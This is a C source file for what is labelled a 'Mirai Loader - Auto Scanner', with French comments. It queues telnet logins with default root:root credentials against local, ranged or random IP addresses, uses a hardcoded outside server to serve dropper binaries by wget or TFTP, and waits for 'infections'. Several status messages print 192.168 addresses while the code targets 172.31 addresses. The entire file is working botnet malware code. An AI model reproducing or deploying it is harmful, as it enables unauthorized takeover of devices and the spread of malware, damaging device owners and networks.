#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <time.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"

static void *stats_thread(void *);
static struct server *srv;
char *id_tag = "telnet";

// Mode de fonctionnement
#define MODE_MANUAL      0
#define MODE_AUTO_LAB    1
#define MODE_AUTO_RANGE  2
#define MODE_AUTO_RANDOM 3

int scan_mode = MODE_MANUAL;

// Prototypes
void auto_scan_lab(void);
void auto_scan_range(char *start_ip, char *end_ip);
void auto_scan_random(void);
void uint32_to_ip(uint32_t ip, char *buffer);

// ==================== FONCTIONS UTILITAIRES ====================

void uint32_to_ip(uint32_t ip, char *buffer)
{
    sprintf(buffer, "%d.%d.%d.%d",
            (ip >> 24) & 0xFF,
            (ip >> 16) & 0xFF,
            (ip >> 8) & 0xFF,
            ip & 0xFF);
}

// ==================== FONCTIONS DE SCAN ====================

void auto_scan_lab(void)
{
    struct telnet_info info;
    uint32_t total = 0;
    
    printf("Scanning 192.168.1.1 to 192.168.1.254\n\n");
    
    for (int i = 1; i <= 254; i++)
    {
        char strbuf[128];
        snprintf(strbuf, sizeof(strbuf), "172.31.16.%d:23 root:root", i);
        
        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) != NULL)
        {
            server_queue_telnet(srv, &info);
            total++;
            printf("[%4d] Queued: 192.168.1.%d\n", total, i);
            usleep(50000);
        }
    }
    
    printf("\n[*] %d IPs queued.\n", total);
}

void auto_scan_range(char *start_ip, char *end_ip)
{
    struct telnet_info info;
    uint32_t total = 0;
    uint32_t start = ntohl(inet_addr(start_ip));
    uint32_t end = ntohl(inet_addr(end_ip));
    char current_ip[16];
    
    if (start >= end)
    {
        printf("[!] Start IP must be less than end IP\n");
        return;
    }
    
    printf("Scanning from %s to %s\n\n", start_ip, end_ip);
    
    for (uint32_t ip = start; ip <= end; ip++)
    {
        uint32_t net_ip = htonl(ip);
        uint32_to_ip(net_ip, current_ip);
        
        char strbuf[128];
        snprintf(strbuf, sizeof(strbuf), "%s:23 root:root", current_ip);
        
        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) != NULL)
        {
            server_queue_telnet(srv, &info);
            total++;
            printf("[%4d] Queued: %s\n", total, current_ip);
            usleep(30000);
        }
    }
    
    printf("\n[*] %d IPs queued.\n", total);
}

void auto_scan_random(void)
{
    struct telnet_info info;
    uint32_t total = 0;
    int max_scans = 1000;
    
    srand(time(NULL));
    printf("Generating %d random IPs in 192.168.x.x\n\n", max_scans);
    
    for (int i = 0; i < max_scans; i++)
    {
        char strbuf[128];
        uint8_t o3 = rand() % 256;
        uint8_t o4 = (rand() % 254) + 1;
        
        snprintf(strbuf, sizeof(strbuf), "172.31.%d.%d:23 root:root", o3, o4);
        
        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) != NULL)
        {
            server_queue_telnet(srv, &info);
            total++;
            printf("[%4d] Queued: 192.168.%d.%d\n", total, o3, o4);
            usleep(20000);
        }
    }
    
    printf("\n[*] %d IPs queued.\n", total);
}

// ==================== MAIN ====================

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;
    int choice;

    addrs_len = 1;
    addrs = calloc(addrs_len, sizeof(ipv4_t));
    addrs[0] = inet_addr("13.60.90.46");

    if (argc == 2)
        id_tag = args[1];

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
                              1024 * 64, "13.60.90.46", 80, "13.60.90.46")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    printf("\n========================================\n");
    printf("    Mirai Loader - Auto Scanner\n");
    printf("========================================\n\n");
    printf("1. Mode Manuel\n");
    printf("2. Scan Auto - Reseau local (192.168.1.0/24)\n");
    printf("3. Scan Auto - Plage personnalisee\n");
    printf("4. Scan Auto - IPs aleatoires\n\n");
    printf("Choix: ");
    scanf("%d", &choice);
    getchar();

    switch (choice)
    {
        case 1:
            printf("[*] Mode manuel. Entrez les cibles: ip:port user:pass\n");
            printf("    Exemple: 192.168.1.11:23 root:root\n\n");
            
            while (TRUE)
            {
                char strbuf[1024];
                printf("> ");
                fflush(stdout);
                
                if (fgets(strbuf, sizeof(strbuf), stdin) == NULL)
                    break;

                util_trim(strbuf);
                if (strlen(strbuf) == 0)
                    continue;

                memset(&info, 0, sizeof(struct telnet_info));
                if (telnet_info_parse(strbuf, &info) == NULL)
                    printf("Format invalide. Utilisez: ip:port user:pass\n");
                else
                {
                    server_queue_telnet(srv, &info);
                    if (total++ % 1000 == 0)
                        sleep(1);
                }
            }
            break;
            
        case 2:
            auto_scan_lab();
            break;
            
        case 3:
            {
                char start_ip[16], end_ip[16];
                printf("IP de debut (ex: 192.168.1.1): ");
                scanf("%s", start_ip);
                printf("IP de fin (ex: 192.168.1.254): ");
                scanf("%s", end_ip);
                auto_scan_range(start_ip, end_ip);
            }
            break;
            
        case 4:
            auto_scan_random();
            break;
            
        default:
            printf("[!] Option invalide. Mode manuel par defaut.\n");
            break;
    }

    printf("\n[*] Scan termine. Attente des infections...\n");
    
    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);
    
    printf("[*] Loader termine.\n");
    return 0;
}

// ==================== THREAD STATISTIQUES ====================

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), 
               ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), 
               ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
    return NULL;
}